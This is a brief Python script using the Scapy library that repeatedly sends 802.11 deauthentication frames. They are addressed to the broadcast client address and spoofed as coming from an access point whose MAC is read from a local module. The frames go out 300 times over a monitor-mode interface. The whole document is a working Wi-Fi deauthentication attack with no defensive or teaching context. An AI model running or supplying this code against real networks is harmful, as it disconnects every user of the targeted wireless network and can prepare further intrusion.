from scapy.all import *
import time
import read
#from read import mak
# Access Point MAC Address
for i in range(300):
	print(i)
	#time.sleep(0.5)
	ap = read.mak

	client = "FF:FF:FF:FF:FF:FF" # Use This Option Only When You Don't Know Client Address

	pkt = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth() # Deauthentication Packet For Access Point

	sendp(pkt, iface="wlan0mon")

print (read.mak)
print (read.mak)
print (read.mak)
